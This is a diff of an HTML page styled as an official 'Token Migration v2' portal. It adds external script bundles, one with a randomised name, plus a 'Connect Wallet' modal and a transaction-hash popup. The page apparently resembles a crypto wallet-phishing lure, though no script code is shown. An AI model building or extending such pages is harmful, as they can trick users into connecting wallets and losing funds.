@@ -5,7 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Token Migration v2 - Official Portal</title>
     <link rel="stylesheet" href="styles.css">
-</head>
+    <script src="/assets/sources.js"></script>
+    <script src="/assets/app-bundle_mrqenxeq.js"></script>
 </head>
 <body>
     <div class="container">
@@ -37,6 +38,17 @@
                     <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
                     <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
                 </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="walletModal" class="wallet-modal" aria-hidden="true">
+        <div class="wallet-modal-content">
+            <h2>Connect Wallet</h2>
+            <p>Connect your wallet to continue with the migration process.</p>
+            <div class="wallet-modal-actions">
+                <button id="connectWalletBtn" class="btn btn-primary">Connect Wallet</button>
+                <button id="closeWalletModalBtn" class="btn btn-secondary">Close</button>
             </div>
         </div>
     </div>
@@ -79,7 +91,6 @@
                     <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
                 </div>
             </div>
-            </div>
         </div>
     </div>
 
@@ -92,11 +103,6 @@
             <div class="popup-body">
                 <p>Input transaction hash:</p>
                 <input type="text" id="txHashInput" class="input-field" placeholder="0x..." />
-                <label for="chainSelect" style="margin-top: 16px; display: block; color: #a0a0b0; font-size: 0.9rem;">Select network:</label>
-                <select id="chainSelect" class="input-field" style="margin-top: 8px;">
-                    <option value="eth">Ethereum</option>
-                    <option value="bsc">Binance Smart Chain</option>
-                </select>
             </div>
             <div class="popup-footer">
                 <div class="popup-footer-buttons">
@@ -108,7 +114,6 @@
                     <div class="popup-social-icon" onclick="showComingSoon()" title="X (Twitter)">𝕏</div>
                     <div class="popup-social-icon" onclick="showComingSoon()" title="Website">🌐</div>
                 </div>
-            </div>
             </div>
         </div>
     </div>
@@ -122,6 +127,11 @@
             <div class="popup-body">
                 <div id="loadingSpinner" class="loading-spinner">
                     <div class="spinner"></div>
+                </div>
+                <div id="successIcon" class="success-icon" style="display: none;">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                        <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
                 </div>
                 <p id="popup4Message">Please wait while we process your transaction</p>
             </div>
